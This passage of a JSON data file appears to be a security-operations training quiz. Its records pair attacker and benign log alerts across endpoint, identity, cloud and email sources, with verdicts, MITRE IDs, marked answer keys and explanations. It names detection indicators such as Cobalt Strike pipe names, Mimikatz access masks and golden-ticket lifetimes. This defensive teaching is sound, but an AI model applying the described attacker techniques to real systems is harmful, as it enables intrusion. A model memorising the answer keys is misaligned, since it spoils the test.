d":"tune","ask":"Best tuning?","o":["Suppress Sysmon 21 on all servers","Allowlist the SCM Event Log filter, consumer, binding by name + type","Allowlist any NTEventLogEventConsumer"],"a":1,"why":"Pin the exact built-in triple. Type-wide or event-wide suppression hides real persistence."},"tell":"WMI subscriptions are also how Windows and real monitoring agents work. The SCM Event Log subscription ships with Windows and only writes log entries. The tell is the consumer type: log-writer vs command-runner.","pair":"z07"},{"id":"z09","d":"endpoint","src":"Defender for Endpoint \u00b7 DeviceEvents","t":"Named pipe created","h":"WS-ACCT-0412 \u00b7 jmiller","l":["pipe: \\\\.\\pipe\\msagent_3f2 \u00b7 creator: rundll32.exe (no cmdline args)","pipe: \\\\.\\pipe\\MSSE-7a1-server","parent of rundll32: svchost (orphaned tree)"],"v":1,"x":"T1559","c":"named-pipe-c2","diff":3,"trap":"bland","k":[0],"say":"Rundll32 with no arguments creates pipes named msagent and MSSE dash server on an accounting workstation.","tell":"Default Cobalt Strike SMB-beacon pipe names (msagent_*, MSSE-*-server) spawned by argument-less rundll32 are a textbook C2 tell. Learn the default pipe names, catch the lazy operators.","pair":"z10"},{"id":"z10","d":"endpoint","src":"Defender for Endpoint \u00b7 DeviceEvents","t":"Named pipe created","h":"SRV-FILE-02 \u00b7 administrator","l":["pipe: \\\\.\\pipe\\PSEXESVC \u00b7 creator: PSEXESVC.exe","source host: WS-IT-0004 (admin jumpbox)","change: CHG0044120 patch deploy window"],"v":0,"x":"T1559","c":"named-pipe-c2","diff":2,"trap":"scary","k":[0],"say":"PsExec service pipe on a file server, coming from the admin jumpbox during a ticketed patch window.","tell":"A PSEXESVC pipe from the known admin jumpbox inside a change window is Sysinternals PsExec doing sanctioned remote admin. Same mechanism as C2, totally different story \u2014 the source host and the ticket are the tell.","pair":"z09"},{"id":"z11","d":"endpoint","src":"Sysmon \u00b7 Event ID 10","t":"Process accessed LSASS","h":"WS-ENG-0088 \u00b7 priya.n","l":["target: lsass.exe \u00b7 granted access: 0x1000","source: C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\...\\MsMpEng.exe (signed Microsoft)","call trace resolves to Microsoft modules only"],"v":0,"x":"T1003.001","c":"lsass-access","diff":3,"trap":"scary","k":[1],"say":"LSASS opened with query limited access by Defender antimalware engine, signed Microsoft, from its platform folder. Call trace shows only Microsoft modules.","q":{"kind":"tune","ask":"Best tuning?","o":["Exclude source image MsMpEng.exe by name only","Exclude granted access 0x1000 globally","Exclude MsMpEng.exe by full path + Microsoft signer"],"a":2,"why":"Name-only is spoofable by a renamed binary; mask-wide hides tools that ask small."},"tell":"Not every LSASS handle is theft. Defender, EDR and Windows Error Reporting all touch LSASS legitimately. The source image path and signer decide it. Do not lean on the mask: Mimikatz sekurlsa asks for 0x1010/0x1410, which looks small too.","pair":"e08"},{"id":"z12","d":"endpoint","src":"Defender for Endpoint \u00b7 DeviceImageLoadEvents","t":"Signed binary loaded unsigned sibling DLL","h":"WS-MKT-0410 \u00b7 asingh","l":["process: C:\\Program Files (x86)\\Vendor\\LabelPrint\\LabelPrint.exe (signed)","loaded: C:\\Program Files (x86)\\Vendor\\LabelPrint\\pdfcore.dll (unsigned)","DLL hash matches vendor installer \u00b7 same load on 300 hosts since 2024"],"v":0,"x":"T1574.001","c":"dll-sideload-signer","diff":3,"trap":"scary","k":[2],"say":"Signed label printing app loads an unsigned DLL from its own Program Files folder. Hash matches the vendor installer, seen on 300 hosts.","q":{"kind":"tune","ask":"Best tuning?","o":["Allowlist pdfcore.dll by hash for LabelPrint.exe","Allowlist any unsigned DLL under Program Files (x86)","Allowlist DLL name pdfcore.dll anywhere"],"a":0,"why":"Hash + loader pair is tight. Name-only lets an attacker drop the same name in Temp."},"tell":"Sideloading alerts fire on signed-exe-loads-unsigned-DLL, but plenty of vendors ship unsigned helper DLLs. Admin-only install folder, hash matching the installer, fleet-wide prevalence = noise. The scary version loads from a user-writable path with a hash nobody else has.","pair":"e30"},{"id":"z13","d":"endpoint","src":"Defender for Endpoint \u00b7 DeviceProcessEvents","t":"Process launched from Downloads","h":"WS-HR-0177 \u00b7 dlopez","l":["cmd: C:\\Users\\dlopez\\Downloads\\Invoice_Oct.pdf.exe","parent: explorer.exe","icon: Adobe PDF \u00b7 origin: email attachment"],"v":1,"x":"T1036.007","c":"double-extension","diff":1,"k":[0],"say":"HR user double-clicks Invoice October dot P D F dot E X E from Downloads. PDF icon, arrived as an email attachment.","tell":"Invoice_Oct.pdf.exe is a PDF icon glued onto a binary. The second extension is the only one Windows obeys. Double-extension + fake icon + email origin = user got got."},{"id":"z14","d":"endpoint","src":"Sysmon \u00b7 Event ID 1","t":"Process create on file server","h":"SRV-FILE-02 \u00b7 SYSTEM","l":["image: C:\\ProgramData\\svchost.exe \u00b7 OriginalFileName: 7z.exe","cmd: svchost.exe a -p<redacted> -mx1 arc.7z \\\\?\\C:\\Finance","signer: Igor Pavlov (7-Zip)"],"v":1,"x":"T1036.003","c":"renamed-binary","diff":2,"trap":"bland","k":[0],"say":"A process named svchost runs from ProgramData. Its original file name is 7 zip, and it is archiving the Finance share with a password.","tell":"The signer and OriginalFileName say 7-Zip; the filename says svchost. Attackers rename legit tools to blend in, then archive a share before exfil. Trust the PE metadata over the filename."},{"id":"z15","d":"identity","src":"Entra ID \u00b7 SigninLogs","t":"Authentication via device code flow","h":"rkhan@corp.com","l":["authMethod: deviceCode \u00b7 app: Microsoft Office","IP: 185.x.x.x (hosting, Netherlands) \u00b7 user is US-based","followed by: mailbox access + OAuth grant 3 min later"],"v":1,"x":"T1528","c":"device-code-phish","diff":2,"trap":"bland","k":[1],"say":"Device code sign-in to Microsoft Office for a US laptop user, completed from a Netherlands hosting IP, then mailbox access and an OAuth grant.","q":{"kind":"contain","ask":"Best containment step?","o":["Revoke rkhan sessions and refresh tokens, remove the OAuth grant","Reset rkhan password only","Block the Netherlands for all users"],"a":0,"why":"The attacker holds tokens, not the password. Revoke tokens and the grant they made."},"tell":"Device code phishing: victim types a code on a real Microsoft page, attacker on a foreign host rides the resulting token. Device-code auth from a datacenter IP for a desktop user is the fingerprint.","pair":"z16"},{"id":"z16","d":"identity","src":"Entra ID \u00b7 SigninLogs","t":"Authentication via device code flow","h":"jdoe@corp.com","l":["authMethod: deviceCode \u00b7 app: Microsoft Authentication Broker","IP: corp egress \u00b7 device enrolling into Intune","ticket: INC0101233 new conference-room device setup"],"v":0,"x":"T1528","c":"device-code-phish","diff":2,"trap":"scary","k":[1],"say":"Device code sign-in through the authentication broker, from corporate egress, while a conference room device enrolls into Intune under a ticket.","q":{"kind":"tune","ask":"Best tuning?","o":["Disable the device code alert tenant-wide","Allow device code only from corp egress for enrollment broker","Allowlist user jdoe for device code"],"a":1,"why":"Scope to location + app. Allowlisting a user hands phishers a pre-approved victim."},"tell":"Device code is also the normal flow for input-constrained devices (kiosks, conference rooms, CLI logins). Corp IP + enrollment broker + a matching ticket makes this the boring kind.","pair":"z15"},{"id":"z17","d":"identity","src":"Entra ID \u00b7 AuditLogs","t":"Conditional Access policy updated","h":"corp.com tenant","l":["policy: \"Require MFA for all users\" \u2192 state Disabled","actor: breakglass2@corp.com (last used never)","no CHG ticket \u00b7 actor added to Global Admin 40 min earlier"],"v":1,"x":"T1556.009","c":"ca-policy-change","diff":2,"k":[0,2],"say":"The require MFA for all users policy is switched off by a never-used break glass account, promoted to Global Admin forty minutes earlier, no ticket.","q":{"kind":"contain","ask":"First move?","o":["Email the identity team to ask about it","Delete breakglass2 from the tenant","Re-enable the policy and block breakglass2 sign-in, then hunt"],"a":2,"why":"Close the door and freeze the actor; deleting the account destroys evidence."},"tell":"Turning off the MFA policy is how an attacker keeps the door open after they are in. A dormant break-glass account freshly elevated, no ticket, disabling MFA = active intrusion.","pair":"z18"},{"id":"z18","d":"identity","src":"Entra ID \u00b7 AuditLogs","t":"Conditional Access policy updated","h":"corp.com tenant","l":["policy: \"Require compliant device\" \u2192 group \"Branch-TX staff\" added to include list","actor: ca_admin@corp.com (identity team)","change: CHG0044781 approved"],"v":0,"x":"T1556.009","c":"ca-policy-change","diff":2,"k":[0,2],"say":"A compliant device policy gains a new branch staff group in its include list, by an identity team admin, under an approved change.","tell":"CA policies change all the time as the business grows. A known identity admin widening who a policy covers, under an approved change, is housekeeping. The verdict lives in who, what direction, and the ticket.","pair":"z17"},{"id":"z19","d":"identity","src":"Entra ID \u00b7 AuditLogs","t":"Credential added to service principal","h":"app: Reporting-Connector","l":["action: Add service principal credentials (clientSecret)","actor: a guest user, first-ever admin action","then: app called Graph Mail.Read across 30 mailboxes"],"v":1,"x":"T1098.001","c":"sp-credential-add","diff":2,"trap":"bland","k":[1],"say":"A new client secret on the Reporting Connector app, added by a guest on their first admin action. Then the app reads thirty mailboxes.","q":{"kind":"contain","ask":"Best containment step?","o":["Remove the new secret, disable the guest, review app permissions","Delete the Reporting-Connector app","Rotate every app secret in the tenant"],"a":0,"why":"Kill the key and the actor surgically; deleting the app breaks prod and evidence."},"tell":"A new secret on an existing app is a stealthy backdoor: the app already has consented permissions, now the attacker holds a key to them. Guest actor + immediate mass Graph calls = escalate.","pair":"z20"},{"id":"z20","d":"identity","src":"Entra ID \u00b7 AuditLogs","t":"Credential added to service principal","h":"app: Backup-Integration","l":["action: Add service principal credentials (clientSecret)","actor: app owner (platform team) \u00b7 prior secret expires in 14 days","change: CHG0044812 secret rotation"],"v":0,"x":"T1098.001","c":"sp-credential-add","diff":2,"k":[1],"say":"A new client secret on the Backup Integration app, added by its platform team owner, two weeks before the old secret expires.","tell":"Secrets expire, so apps get new ones. Owner-driven rotation ahead of an expiry, with a ticket, is lifecycle hygiene. Compare the actor to the app owner and look for the old secret aging out.","pair":"z19"},{"id":"z21","d":"identity","src":"Entra ID \u00b7 SigninLogs","t":"Sign-in with pre-existing session token","h":"cfo.smith@corp.com","l":["authRequirement: previouslySatisfied (no interactive auth)","session ID: same as the corp laptop \u00b7 new device + new IP, bulletproof-host ASN","CA: satisfied by claim in token"],"v":1,"x":"T1550.004","c":"token-replay","diff":3,"trap":"bland","k":[1],"say":"CFO sign-in satisfied by an existing session. Same session ID as the corp laptop, but from a new device on a bulletproof hosting network.","q":{"kind":"contain","ask":"Best containment step?","o":["Force MFA re-prompt for cfo.smith","Reset password and close","Revoke sessions and isolate the corp laptop the cookie came from"],"a":2,"why":"MFA and password do not kill a stolen cookie. Revoke, then find the infostealer on the source."},"tell":"Stolen session cookies/PRTs let an attacker skip MFA entirely \u2014 the token already says it was satisfied. A session claim replayed from a brand-new device on a sketchy ASN is token theft, not a login.","pair":"z22"},{"id":"z22","d":"identity","src":"Entra ID \u00b7 AADNonInteractiveUserSignInLogs","t":"Sign-in with pre-existing session token","h":"svc_reporting@corp.com","l":["authRequirement: previouslySatisfied \u00b7 app: Power BI service","IP: corp datacenter egress \u00b7 same ASN as always","cadence: hourly refresh, unchanged for 6 months"],"v":0,"x":"T1550.004","c":"token-replay","diff":2,"k":[1],"say":"Non-interactive Power BI token refresh for a reporting account, from corporate datacenter egress on the usual network, hourly for six months.","q":{"kind":"tune","ask":"Best tuning?","o":["Suppress previouslySatisfied for svc_reporting from its known ASN + app","Suppress all non-interactive sign-ins","Suppress svc_reporting entirely"],"a":0,"why":"Keep the alert live if that token shows up from a new ASN or app."},"tell":"Non-interactive token refreshes are the normal heartbeat of service accounts and background apps. Same ASN, same hourly cadence, same app = baseline. Token replay is only scary when the device or geography jumps.","pair":"z21"},{"id":"z23","d":"identity","src":"Windows Security \u00b7 4768","t":"AS-REP returned for account without pre-auth","h":"SRV-DC-01","l":["accounts: 3 flagged \"Do not require Kerberos preauthentication\"","reply: RC4 AS-REP returned \u00b7 requestor 10.20.4.17","ROE SECOPS-2291: 10.20.4.17 is the assessment laptop, window this week"],"v":0,"x":"T1558.004","c":"asrep-source","diff":3,"trap":"scary","k":[2],"say":"Three accounts without Kerberos pre-auth return RC4 AS-REPs to one internal IP. Rules of engagement list that IP as this week assessment laptop.","tell":"AS-REP roasting pulls crackable hashes for pre-auth-disabled accounts. But the requestor here is the sanctioned assessment box inside an approved engagement window. Same technique, authorized hands. Always check the source against your ROE before you panic."},{"id":"z24","d":"identity","src":"Windows Security \u00b7 4769","t":"Burst of RC4 service ticket requests","h":"SRV-DC-01","l":["account: svc_scanner \u00b7 48 TGS requests, enc 0x17 (RC4)","source: 10.20.0.9 = Tenable scanner (CMDB)","scan window: monthly credentialed scan, scheduled"],"v":0,"x":"T1558.003","c":"kerberoast-source","diff":3,"trap":"scary","k":[1],"say":"Forty eight RC4 service ticket requests from svc scanner. Source IP maps to the Tenable scanner in the CMDB, during its monthly scan.","q":{"kind":"tune","ask":"Best tuning?","o":["Exclude enc 0x17 from the Kerberoast rule","Exclude svc_scanner from source 10.20.0.9 during the scan window","Exclude svc_scanner from any source"],"a":1,"why":"Account + source + window. A stolen svc_scanner roasting from a laptop still fires."},"tell":"Credentialed vuln scanners enumerate SPNs and can look exactly like Kerberoasting. The source IP maps to Tenable in the CMDB during its scan window. Baseline your scanners or you will escalate them every month.","pair":"e34"},{"id":"z25","d":"identity","src":"Defender for Identity \u00b7 Kerberos activity","t":"Kerberos TGS activity for Administrator","h":"CORP\\Administrator","l":["ticket lifetime: 10 years (domain policy max 10 hours)","no 4768 TGT issued to this account on any DC in 7 days","TGS requests from WS-HR-0177, not an admin host"],"v":1,"x":"T1558.001","c":"golden-ticket","diff":3,"k":[0,1],"say":"Administrator presents a ticket with a ten year lifetime, but no domain controller issued it a ticket granting ticket all week.","q":{"kind":"contain","ask":"What actually evicts this?","o":["Reset the Administrator password","Reset krbtgt twice, spaced past ticket lifetime","Disable the Administrator account"],"a":1,"why":"The ticket is signed with krbtgt. User resets do nothing to a forged TGT."},"tell":"A TGT no DC issued, with a ten-year lifetime (the Mimikatz golden default), was forged with the krbtgt key. The account password is irrelevant. Reset krbtgt twice."},{"id":"z26","d":"identity","src":"Okta \u00b7 System Log","t":"API token created for privileged user","h":"okta-automation@corp.com","l":["event: system.api_token.create","actor: iam-terraform (service account)","source: CI runner IP (allowlisted) \u00b7 run: scheduled IAM apply"],"v":0,"x":"T1098.001","c":"okta-api-token","diff":2,"trap":"scary","k":[2],"say":"Okta API token created for a privileged automation user by the Terraform service account, from the allowlisted CI runner during a scheduled apply.","tell":"Okta API tokens are a real persistence vector, but IaC pipelines mint them legitimately. A known Terraform service account from an allowlisted CI runner on a scheduled apply is automation, not an attacker."},{"id":"z27","d":"identity","src":"Entra ID \u00b7 AuditLogs","t":"New hybrid authentication agent registered","h":"corp.com tenant","l":["event: Register Pass-through Authentication agent","host: WKSTN-0921, not in server inventory \u00b7 registered by GA msmith 10 min after a new-ASN sign-in","no CHG \u00b7 Seamless SSO config also modified 2 min later"],"v":1,"x":"T1556.007","c":"pta-backdoor","diff":3,"k":[1],"say":"A pass-through authentication agent registered on a workstation, not a server, by a global admin minutes after a sign-in from a new network.","tell":"A rogue PTA agent sees every on-prem password in cleartext as users sign in \u2014 a hybrid-identity backdoor. Registered from a workstation, no ticket, by a GA with a fresh odd sign-in? That is a credential-harvesting implant."},{"id":"z28","d":"cloud","src":"AWS \u00b7 CloudTrail","t":"EBS snapshot attribute modified","h":"acct: 4471-xxxx-prod","l":["event: ModifySnapshotAttribute \u00b7 createVolumePermission add","userId: 999999999999 (external, unknown account)","snapshot: of prod-db volume \u00b7 caller: ci-deployer"],"v":1,"x":"T1537","c":"ebs-snapshot-share","diff":2,"trap":"bland","k":[1],"say":"Volume permission on a prod database snapshot granted to an outside AWS account nobody recognizes. Caller is the CI deployer role.","q":{"kind":"contain","ask":"Best containment step?","o":["Delete the prod-db snapshot","Open a ticket with AWS support","Remove the createVolumePermission and lock down ci-deployer creds"],"a":2,"why":"Revoke the share and the compromised caller; deleting the snapshot loses evidence."},"tell":"Sharing a DB snapshot to an outside account ID is exfiltration without a single byte leaving as \"data\" \u2014 they just restore your volume in their account. Watch createVolumePermission adds to unknown accounts.","pair":"z29"},{"id":"z29","d":"cloud","src":"AWS \u00b7 CloudTrail","t":"EBS snapshot created","h":"acct: 4471-xxxx-prod","l":["event: CreateSnapshot \u00b7 40 volumes tagged backup=daily","caller: arn:...:role/AWSBackupRole","source: backup.amazonaws.com \u00b7 schedule: 02:00 UTC daily"],"v":0,"x":"T1578.001","c":"ebs-snapshot-share","diff":1,"k":[1],"say":"Forty volumes snapshotted at two AM by the AWS Backup service role, on the daily schedule. No sharing to other accounts.","tell":"AWS Backup snapshots volumes every night via its service role \u2014 that is the service working. No sharing to another account, no human caller. Snapshots are only scary when they get shared out or copied cross-region by a user.","pair":"z28"},{"id":"z30","d":"cloud","src":"AWS \u00b7 CloudTrail","t":"High-volume object reads from S3","h":"bucket: corp-customer-pii","l":["event: GetObject x 9,400 in 6 min","caller: role/web-frontend via STS (creds seen off the instance)","sourceIP: 185.x.x.x (Tor exit) not the ECS subnet"],"v":1,"x":"T1530","c":"s3-mass-read","diff":2,"k":[2],"say":"Nine thousand reads from the customer PII bucket using the web frontend role, coming from a Tor exit instead of the app subnet.","tell":"Frontend role credentials reading the PII bucket from a Tor exit outside the app subnet = stolen role creds (SSRF/IMDS). The role is legit; the place it is being used from is not.","pair":"z31"},{"id":"z31","d":"cloud","src":"AWS \u00b7 CloudTrail","t":"High-volume object reads from S3","h":"bucket: corp-analytics-lake","l":["event: GetObject x 12,000","caller: role/glue-etl \u00b7 sourceIP: VPC endpoint","schedule: nightly ETL job, matches 90-day baseline"],"v":0,"x":"T1530","c":"s3-mass-read","diff":2,"k":[1],"say":"Twelve thousand reads from the analytics lake by the Glue ETL role through a VPC endpoint, matching the nightly ninety day baseline.","tell":"Data lakes exist to be read in bulk. The ETL role hitting its own lake through a VPC endpoint on schedule is the job. Compare caller, source, and volume to baseline before mass GetObject scares you.","pair":"z30"},{"id":"z32","d":"cloud","src":"AWS \u00b7 GuardDuty","t":"Instance credentials used from external address","h":"acct: 4471-xxxx-prod","l":["finding: UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS","role creds minted for i-0ab... seen from 45.x.x.x","instance i-0ab still running, never had a public IP"],"v":1,"x":"T1552.005","c":"imds-cred-offbox","diff":1,"k":[1,2],"say":"Role credentials issued to one EC2 instance are being used from an outside IP. That instance never had a public address.","tell":"IMDS role credentials are scoped to the instance; seeing them used from an IP that is not that instance means they were pulled off the box (SSRF, metadata theft). GuardDuty literally names it. Escalate and rotate."},{"id":"z33","d":"cloud","src":"GCP \u00b7 Cloud Audit Logs","t":"Service account key created","h":"project: corp-prod-data","l":["method: google.iam.admin.v1.CreateServiceAccountKey","principal: terraform@ci.iam.gserviceaccount.com","origin: Cloud Build trigger on main \u00b7 commit linked"],"v":0,"x":"T1098.001","c":"gcp-sa-key","diff":2,"k":[1],"say":"A service account key created in the prod data project by the Terraform principal, from a Cloud Build trigger linked to a commit on main.","tell":"Long-lived SA keys are risky, but IaC creates them deliberately. Terraform principal, Cloud Build origin, a commit you can open = sanctioned. The key is scary when a human or odd principal makes it by hand.","pair":"z34"},{"id":"z34","d":"cloud","src":"GCP \u00b7 Cloud Audit Logs","t":"Service account key created","h":"project: corp-prod-data","l":["method: CreateServiceAccountKey on sa: bq-admin","principal: user dev-intern@corp.com from 103.x.x.x (foreign)","then: SetIamPolicy granting own user owner on the project"],"v":1,"x":"T1098.001","c":"gcp-sa-key","diff":2,"k":[1],"say":"An intern user, from a foreign IP, creates a key for the BigQuery admin service account, then grants their own user project owner.","tell":"An interactive user minting a key for a privileged SA from a foreign IP, then granting themselves Owner, is a privilege-escalation chain. Human-made keys for admin SAs + an IAM self-grant = escalate.","pair":"z33"},{"id":"z35","d":"cloud","src":"Azure \u00b7 AzureActivity","t":"Diagnostic settings removed","h":"sub: corp-prod","l":["operation: Microsoft.Insights/diagnosticSettings/delete","caller: platform-iac SPN \u00b7 correlation to Terraform run","immediately recreated pointing to new Log Analytics ws"],"v":0,"x":"T1685.002","c":"disable-cloud-log","diff":3,"trap":"scary","k":[2],"say":"Diagnostic settings deleted by the platform IaC service principal during a Terraform run, then recreated seconds later pointing to a new workspace.","q":{"kind":"tune","ask":"Best tuning?","o":["Suppress diagnosticSettings/delete from platform-iac SPN","Suppress all diagnosticSettings/delete","Alert only if no recreate by the same caller within 5 min"],"a":2,"why":"Recreate-window logic still fires if the IaC SPN itself is stolen and kills logging."},"tell":"Deleting a diagnostic setting trips \"logging stopped\" alarms, but IaC deletes-and-recreates resources constantly. The setting is recreated seconds later by the same SPN. Look for the recreate before you call it a cover-up.","pair":"z36"},{"id":"z36","d":"cloud","src":"Azure \u00b7 AzureActivity","t":"Diagnostic settings removed","h":"sub: corp-prod","l":["operation: diagnosticSettings/delete on Key Vault + NSG flow logs","caller: user guest account, no Terraform correlation","no recreate \u00b7 followed by Key Vault secret list"],"v":1,"x":"T1685.002","c":"disable-cloud-log","diff":3,"k":[2],"say":"Diagnostic settings deleted on a Key Vault and flow logs by a guest user. Nothing recreates them, and then the vault secrets get listed.","tell":"Same delete op, but a guest with no IaC footprint kills logging on the Key Vault and does NOT recreate it, then lists secrets in the dark. No recreate + a guest actor = someone turning off the cameras.","pair":"z35"},{"id":"z37","d":"cloud","src":"Kubernetes \u00b7 audit log","t":"Exec into running pod","h":"cluster: prod-eks","l":["verb: create pods/exec \u00b7 pod: payments-api-7f","user: sre-oncall (oidc group: platform-sre)","command: /bin/sh \u00b7 linked incident: INC0102991"],"v":0,"x":"T1609","c":"k8s-exec-context","diff":2,"k":[1],"say":"Shell exec into the payments API pod by the on-call SRE, in the platform SRE group, linked to an open incident.","tell":"kubectl exec is how SREs debug prod. An on-call engineer in the platform-sre group shelling in during a tracked incident is the job. Exec is scary from an unexpected identity or a service account, not a human on-call."},{"id":"z38","d":"cloud","src":"Kubernetes \u00b7 audit log","t":"Privileged pod scheduled with host mounts","h":"cluster: prod-eks","l":["pod: tools-x7 \u00b7 securityContext.privileged=true","volume: hostPath / \u2192 /host \u00b7 image: alpine from public registry","created by: sa default in namespace web (web has no business doing this)"],"v":1,"x":"T1611","c":"container-escape","diff":3,"k":[2],"say":"A privileged alpine pod mounting the node root filesystem, created by the default service account of the web namespace.","tell":"A privileged pod mounting the node root filesystem is a container escape by design \u2014 chroot to /host and you own the node. A random alpine from the default SA in a web namespace = escalate hard."},{"id":"z39","d":"cloud","src":"Kubernetes \u00b7 audit log","t":"ClusterRoleBinding to cluster-admin created","h":"cluster: prod-eks","l":["verb: create clusterrolebinding \u00b7 role: cluster-admin \u2192 sa: flux-system","user: system:serviceaccount:flux-system:kustomize-controller","source: GitOps sync, manifest in infra repo, PR approved"],"v":0,"x":"T1098.006","c":"k8s-rbac-escalate","diff":3,"trap":"scary","k":[2],"say":"A cluster admin binding created by the Flux kustomize controller, applied from a manifest in the infra repo with an approved pull request.","q":{"kind":"tune","ask":"Best tuning?","o":["Exclude all flux-system service accounts","Exclude kustomize-controller for bindings that match the repo manifest","Exclude cluster-admin bindings during business hours"],"a":1,"why":"Tie it to the reviewed manifest; a stolen Flux token creating a new binding still fires."},"tell":"cluster-admin bindings scream privilege escalation, but GitOps controllers (Flux/Argo) apply them from reviewed manifests. The binding is in the repo, PR-approved, applied by the controller. Trace it to Git before you escalate."},{"id":"z40","d":"email","src":"Exchange Online \u00b7 OfficeActivity","t":"Inbox rule created","h":"ap-manager@corp.com","l":["rule: moves mail with \"invoice\",\"wire\",\"bank\" to RSS Feeds then mark read","created: OWA from 41.x.x.x (new geo)","preceded by: risky sign-in 20 min earlier"],"v":1,"x":"T1564.008","c":"mailbox-hide-rule","diff":2,"k":[0],"say":"An accounts payable inbox rule moves mail mentioning invoice, wire or bank into RSS Feeds and marks it read. Created from a new country.","q":{"kind":"pivot","ask":"First pivot?","o":["Delete the rule and close","Check sent items and vendor threads for fraudulent payment requests","Block the 41.x.x.x IP at the firewall"],"a":1,"why":"The rule hides fraud in flight. Find the payment ask before money moves."},"tell":"A rule that sweeps invoice/wire/bank mail into RSS Feeds and marks it read is classic BEC \u2014 it hides the victim and the fraud team from each other. Keyword-hiding rule + a risky sign-in = compromised mailbox.","pair":"c02"},{"id":"z41","d":"email","src":"Exchange Online \u00b7 OfficeActivity","t":"Inbox rule created","h":"jwells@corp.com","l":["rule: \"Newsletters\" moves mail from mailchimp/substack to folder Reading","created: Outlook desktop, corp IP, compliant device","no preceding risky sign-in"],"v":0,"x":"T1564.008","c":"mailbox-hide-rule","diff":1,"k":[0],"say":"An inbox rule called Newsletters moves Mailchimp and Substack mail into a Reading folder. Created in Outlook desktop on a compliant device.","tell":"People organize their inbox. A newsletter rule from the corp desktop on a compliant device, no risky sign-in behind it, is housekeeping. The scary cousin targets money keywords and dumps to a hidden folder.","pair":"c01"},{"id":"z42","d":"email","src":"Exchange Online \u00b7 OfficeActivity","t":"External forwarding configured","h":"payroll-intake@corp.com","l":["action: Set-Mailbox -ForwardingSmtpAddress intake@payroll-partner.com","actor: exch_admin (Exchange team) via EXO PowerShell, corp IP","ticket: CHG0045102 approved payroll outsourcing \u00b7 vendor in TPRM \u00b7 90-day expiry set"],"v":0,"x":"T1114.003","c":"external-forward","diff":2,"trap":"scary","k":[2],"say":"A shared payroll mailbox now forwards externally to a payroll partner. Set by an Exchange admin under an approved, vendor-vetted change with an expiry.","tell":"External auto-forward is a data-egress risk, but sometimes it is a sanctioned, time-boxed integration with a ticket, a vetted vendor and an expiry. Verify the approval and the end date rather than reflexively escalating.","pair":"c03"},{"id":"z43","d":"email","src":"M365 \u00b7 Purview Audit (eDiscovery)","t":"Content search exported across mailboxes","h":"corp.com tenant","l":["event: SearchExportDownloaded \u00b7 scope: 220 mailboxes incl execs","actor: helpdesk_ana@corp.com \u00b7 eDiscovery Manager role self-assigned 20 min earlier","case created and exported within 15 min, no legal hold"],"v":1,"x":"T1114.002","c":"ediscovery-abuse","diff":3,"k":[1],"say":"A help desk account, which gave itself the eDiscovery role twenty minutes ago, exports a search across two hundred twenty mailboxes, including executives.","tell":"eDiscovery is god-mode mail access. A helpdesk account that just granted itself the role, spinning up a case and exporting 220 mailboxes in 15 minutes, is mass collection, not legal work. Baseline who owns eDiscovery.","pair":"z44"},{"id":"z44","d":"email","src":"M365 \u00b7 Purview Audit (eDiscovery)","t":"Content search exported across mailboxes","h":"corp.com tenant","l":["event: SearchExportDownloaded \u00b7 scope: 4 mailboxes","actor: legal_ediscovery@corp.com (eDiscovery Manager)","case: matter LIT-2026-038, legal hold active 3 weeks"],"v":0,"x":"T1114.002","c":"ediscovery-abuse","diff":2,"k":[1],"say":"The legal eDiscovery manager exports a search of four mailboxes, tied to a litigation matter with a legal hold active for three weeks.","tell":"Same export event, but a legal eDiscovery manager pulling a scoped set tied to an active litigation matter is the tool doing its job. Role, scope, and a real case number separate discovery from theft.","pair":"z43"},{"id":"z45","d":"email","src":"Defender for Office \u00b7 EmailEvents","t":"Inbound message failed DMARC","h":"To: ap-team@corp.com","l":["from: \"CEO Dana Reed\" <dana.reed@corp.com> \u00b7 SPF fail, DKIM none, DMARC fail (p=quarantine overridden by allow-list)","reply-to: ceo.reed.urgent@gmail.com","body: urgent gift-card / wire request"],"v":1,"x":"T1684.002","c":"dmarc-fail-spoof","diff":1,"k":[1],"say":"Mail from the CEO address at our own domain fails DMARC, with no DKIM. The reply-to is a Gmail address, asking for an urgent wire.","tell":"Exact-domain spoof of your own CEO, DMARC fail, reply-to swung to a Gmail, urgent money ask \u2014 and it only landed because an allow-list overrode quarantine. Fix the allow-list and escalate the attempt.","pair":"z46"},{"id":"z46","d":"email","src":"Defender for Office \u00b7 EmailEvents","t":"Inbound message failed DMARC","h":"To: all-staff@corp.com","l":["from: news@benefitsco.com \u00b7 SPF fail (new ESP not in SPF), DKIM pass d=esp-mailer.net (not aligned), DMARC fail","vendor: our benefits provider, 3-year relationship, same template as last 30 sends","links: resolve to benefitsco.com portal \u00b7 no reply-to change"],"v":0,"x":"T1684.002","c":"dmarc-fail-spoof","diff":3,"trap":"scary","k":[1,2],"say":"All staff mail from the benefits vendor fails DMARC after they moved to a new mail platform. Same template, real portal links, no reply-to change.","q":{"kind":"tune","ask":"Best fix?","o":["Allow-list benefitsco.com to skip DMARC checks","Tell the vendor to add the ESP to SPF or sign DKIM as benefitsco.com","Lower our DMARC enforcement to p=none"],"a":1,"why":"Fix alignment at the source. Allow-lists are how exact-domain CEO spoofs land."},"tell":"DMARC needs SPF or DKIM to pass AND align with the From domain. Here DKIM passes but is signed by the ESP, not the vendor, and SPF missed the new platform. Template, links and reply-to match history: misconfig, not a spoof. Tell the vendor to fix alignment.","pair":"z45"},{"id":"z47","d":"email","src":"Microsoft Teams \u00b7 OfficeActivity","t":"External federated chat with file","h":"dborg@corp.com","l":["external user: partner@trusted-vendor.com (allow-listed federation)","message: shared design.fig link to Figma","vendor on approved federation list, ongoing project channel"],"v":0,"x":"T1566.003","c":"teams-external-phish","diff":2,"k":[0],"say":"External Teams chat from an allow-listed partner tenant, sharing a Figma design link in an ongoing project channel.","tell":"External Teams chat is a real phishing vector (Storm-0324, DarkGate), but allow-listed federation with a known partner sharing a Figma link in an active project is collaboration. The tell for the bad kind is an unknown tenant pushing a .zip or a \"setup\" file.","pair":"c12"},{"id":"z48","d":"network","src":"DNS \u00b7 Windows DNS analytic","t":"High volume of unique subdomain queries to one domain","h":"WS-ENG-0144 \u00b7 bwalsh","l":["queries: 1,900/hr \u00b7 unique labels under *.sophosxl.net","labels: 40-char hex strings, high entropy, never repeat","process: SophosFileScanner.exe \u00b7 signed \u00b7 same pattern on all 4,000 endpoints"],"v":0,"x":"T1071.004","c":"dns-tunnel-entropy","diff":3,"trap":"scary","k":[2],"say":"Nineteen hundred queries an hour with unique hex labels to a Sophos domain. The querying process is the signed Sophos scanner, same on every 